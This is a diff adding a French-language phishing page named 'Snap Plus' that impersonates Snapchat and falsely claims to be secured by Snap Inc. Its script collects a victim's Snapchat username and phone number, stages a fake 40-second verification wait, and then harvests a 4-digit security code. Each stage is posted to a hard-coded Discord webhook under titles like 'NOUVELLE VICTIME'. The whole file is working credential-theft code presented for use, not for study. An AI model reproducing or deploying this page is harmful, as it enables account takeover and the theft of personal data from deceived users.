@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snap Plus – Vérification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 32px 24px;
+            box-shadow: 0 0 40px rgba(255, 252, 0, 0.08);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #FFFC00, #FFFC00);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 36px;
+            font-weight: 800;
+            color: #000;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 28px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #ccc;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 12px;
+            background: #2a2a2a;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            background: #333;
+            box-shadow: 0 0 0 2px #FFFC00;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: #FFFC00;
+            color: #000;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: opacity 0.2s;
+        }
+        .btn:active {
+            opacity: 0.85;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .loading-box {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .spinner {
+            width: 42px;
+            height: 42px;
+            border: 3px solid #333;
+            border-top: 3px solid #FFFC00;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 18px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 15px;
+            color: #ddd;
+            line-height: 1.5;
+        }
+        .timer {
+            font-size: 28px;
+            font-weight: 700;
+            color: #FFFC00;
+            margin: 12px 0;
+        }
+        .code-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .code-inputs input {
+            width: 52px;
+            height: 56px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            padding: 0;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ÉTAPE 1 : Pseudo + Numéro -->
+        <div id="step1">
+            <div class="logo">
+                <div class="logo-icon">S+</div>
+                <h1>Snap Plus</h1>
+                <p class="subtitle">Vérification de compte requise</p>
+            </div>
+
+            <div class="form-group">
+                <label>Pseudo Snapchat</label>
+                <input type="text" id="pseudo" placeholder="Ex: jean.dupont" autocomplete="off" required>
+            </div>
+
+            <div class="form-group">
+                <label>Numéro de téléphone</label>
+                <input type="tel" id="numero" placeholder="Ex: 06 12 34 56 78" autocomplete="off" required>
+            </div>
+
+            <button class="btn" onclick="submitInfo()">Valider</button>
+
+            <div class="footer">
+                Sécurisé par Snap Inc. • Vérification obligatoire
+            </div>
+        </div>
+
+        <!-- ÉTAPE 2 : Patienter 40 secondes -->
+        <div id="step2" class="hidden">
+            <div class="loading-box">
+                <div class="spinner"></div>
+                <div class="loading-text">
+                    Vérification en cours...<br>
+                    Veuillez patienter
+                </div>
+                <div class="timer" id="timer">40</div>
+                <div class="loading-text" style="font-size:13px;color:#888;">
+                    Ne fermez pas cette page
+                </div>
+            </div>
+        </div>
+
+        <!-- ÉTAPE 3 : Code 4 chiffres -->
+        <div id="step3" class="hidden">
+            <div class="logo">
+                <div class="logo-icon">S+</div>
+                <h1>Code de sécurité</h1>
+                <p class="subtitle">Un code à 4 chiffres a été envoyé</p>
+            </div>
+
+            <div class="code-inputs">
+                <input type="text" maxlength="1" id="c1" oninput="moveToNext(this, 'c2')" inputmode="numeric">
+                <input type="text" maxlength="1" id="c2" oninput="moveToNext(this, 'c3')" inputmode="numeric">
+                <input type="text" maxlength="1" id="c3" oninput="moveToNext(this, 'c4')" inputmode="numeric">
+                <input type="text" maxlength="1" id="c4" oninput="checkCode()" inputmode="numeric">
+            </div>
+
+            <button class="btn" id="btnCode" onclick="submitCode()" disabled>Confirmer le code</button>
+
+            <div class="footer">
+                Le code expire dans quelques minutes
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ====================== CONFIG ======================
+        const WEBHOOK = "https://discord.com/api/webhooks/1569081440618942544/caNEpOLQM8CtYAZ5KuilSNEG5fMuM_P2eHRfrp7kL5yvfEDMcYC1NE7YYerghL95QLt0";
+        // ====================================================
+
+        let pseudo = "";
+        let numero = "";
+
+        function submitInfo() {
+            pseudo = document.getElementById("pseudo").value.trim();
+            numero = document.getElementById("numero").value.trim();
+
+            if (!pseudo || !numero) {
+                alert("Veuillez remplir tous les champs.");
+                return;
+            }
+
+            // Envoi Discord – Étape 1
+            sendToDiscord({
+                title: "NOUVELLE VICTIME – Infos",
+                color: 16776960,
+                fields: [
+                    { name: "Pseudo", value: pseudo, inline: true },
+                    { name: "Numéro", value: numero, inline: true },
+                    { name: "User-Agent", value: navigator.userAgent, inline: false }
+                ]
+            });
+
+            // Passage à l'étape 2
+            document.getElementById("step1").classList.add("hidden");
+            document.getElementById("step2").classList.remove("hidden");
+
+            // Timer 40 secondes
+            let timeLeft = 40;
+            const timerEl = document.getElementById("timer");
+            const countdown = setInterval(() => {
+                timeLeft--;
+                timerEl.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    document.getElementById("step2").classList.add("hidden");
+                    document.getElementById("step3").classList.remove("hidden");
+                    document.getElementById("c1").focus();
+                }
+            }, 1000);
+        }
+
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1) {
+                document.getElementById(nextId)?.focus();
+            }
+            checkCode();
+        }
+
+        function checkCode() {
+            const code = getCode();
+            document.getElementById("btnCode").disabled = code.length !== 4;
+        }
+
+        function getCode() {
+            return (
+                document.getElementById("c1").value +
+                document.getElementById("c2").value +
+                document.getElementById("c3").value +
+                document.getElementById("c4").value
+            );
+        }
+
+        function submitCode() {
+            const code = getCode();
+            if (code.length !== 4) return;
+
+            // Envoi Discord – Étape 2 (code)
+            sendToDiscord({
+                title: "CODE REÇU",
+                color: 65280,
+                fields: [
+                    { name: "Pseudo", value: pseudo, inline: true },
+                    { name: "Numéro", value: numero, inline: true },
+                    { name: "Code 4 chiffres", value: "||" + code + "||", inline: false }
+                ]
+            });
+
+            // Message final
+            document.getElementById("step3").innerHTML = `
+                <div class="loading-box">
+                    <div style="font-size:42px;margin-bottom:16px;">✓</div>
+                    <div class="loading-text">
+                        Vérification terminée.<br>
+                        Votre compte Snap Plus est maintenant actif.
+                    </div>
+                </div>
+            `;
+        }
+
+        function sendToDiscord(embed) {
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "SnapPlus Logger",
+                    embeds: [embed]
+                })
+            }).catch(err => console.log("Erreur webhook:", err));
+        }
+    </script>
+</body>
+</html>
